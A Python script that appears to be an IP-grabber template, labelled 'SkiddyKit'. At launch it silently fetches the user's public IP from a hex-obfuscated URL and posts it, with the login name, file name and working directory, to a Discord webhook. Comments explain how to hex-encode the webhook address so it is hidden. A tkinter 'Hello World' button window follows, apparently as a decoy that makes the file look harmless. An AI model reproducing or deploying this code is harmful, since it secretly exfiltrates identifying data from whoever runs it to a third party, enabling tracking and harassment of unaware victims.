import requests
import os

def get_ip():
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko)'
    })
    res = s.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e')
    ip = res.json()['\x69\x70']
    return ip

def sendToWebhook(url):
    data = {
        "content" : f"skidxdtoolawesome69, File Name: **{os.path.basename(__file__)}**, Path: **{os.getcwd()}**",
        "username" : "i'm a skid"
    }
    data["embeds"] = [
        {
            "description" : f"{os.getlogin()}'s \x50\x75\x62\x6c\x69\x63\x20\x49\x50\x3a **{get_ip()}**",
            "title" : "SkiddyKit"
        }
    ]

    requests.post(url, json = data)


# Change to bytecode via https://onlinestringtools.com/convert-string-to-bytes
# ADD \x before the number (example: \x64)
# ADD a \x at the start if it isnt there already (\x68)
sendToWebhook("ADD BYTECODE DISCORD WEBHOOK")

import tkinter as tk

root= tk.Tk()

canvas1 = tk.Canvas(root, width = 300, height = 300)
canvas1.pack()

def hello():  
    label1 = tk.Label(root, text= 'Hello World!', fg='blue', font=('helvetica', 12, 'bold'))
    canvas1.create_window(150, 200, window=label1)
    
button1 = tk.Button(text='Click Me', command=hello, bg='brown',fg='white')
canvas1.create_window(150, 150, window=button1)

root.mainloop()
